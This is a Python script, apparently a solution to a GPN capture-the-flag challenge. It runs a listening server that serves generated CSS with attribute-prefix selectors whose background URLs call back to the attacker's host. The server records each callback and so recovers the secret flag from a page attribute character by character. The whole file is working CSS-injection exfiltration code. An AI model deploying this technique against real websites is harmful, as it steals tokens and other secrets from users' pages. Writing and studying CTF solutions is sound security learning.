import http.server, socketserver, urllib.parse, sys, threading

PORT   = 1234
HOST = "http://10.200.200.5"
KNOWN_PREFIX = "GPNCTF{"

CS = list("abcdefghijklmnopqrstuvwxyz"
          "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
          "0123456789_{}")
state = {"known": "fetch('flag=" + KNOWN_PREFIX}
lock  = threading.Lock()

def css_str(s):
    return s.replace("\\", "\\\\").replace('"', '\\"')

def build_css():
    K, out = state["known"], []

    # перебираем пары символов
    for c1 in CS:
        for c2 in CS:
            val = K + c1 + c2
            url = f"{HOST}:{PORT}/h?v={urllib.parse.quote(val, safe='')}"
            out.append('body[onload^="%s"]{background:url("%s")}' % (css_str(val), url))

    # дополнительно перебираем символы по одному (актуально, длина флага без префикса нечетная)
    for c1 in CS:
        val = K + c1
        url = f"{HOST}:{PORT}/h?v={urllib.parse.quote(val, safe='')}"
        out.append('body[onload^="%s"]{background:url("%s")}' % (css_str(val), url))
    return "\n".join(out).encode()

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)

        if u.path == "/s.css":
            body = build_css()
            self.send_response(200)
            self.send_header("Content-Type", "text/css")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print(f"[css] served, known={state['known']!r}", flush=True)
            return

        elif u.path == "/h":
            v = q.get("v", [""])[0]
            with lock:
                if len(v) > len(state["known"]):
                    state["known"] = v
            flag = v.split("flag=", 1)[-1]
            print(f"[hit] {flag}", flush=True)
            if "}" in flag:
                print(f"\n=== FLAG: {flag[:flag.index('}')+1]} ===\n", flush=True)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return

        elif u.path == "/status":
            flag_part = state["known"].split("flag=", 1)[-1] if "flag=" in state["known"] else state["known"]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(flag_part.encode())
            return

        self.send_response(404)
        self.end_headers()

socketserver.ThreadingTCPServer.allow_reuse_address = True
with socketserver.ThreadingTCPServer(("0.0.0.0", PORT), H) as httpd:
    print(f"listening on {HOST}:{PORT}", flush=True)
    httpd.serve_forever()
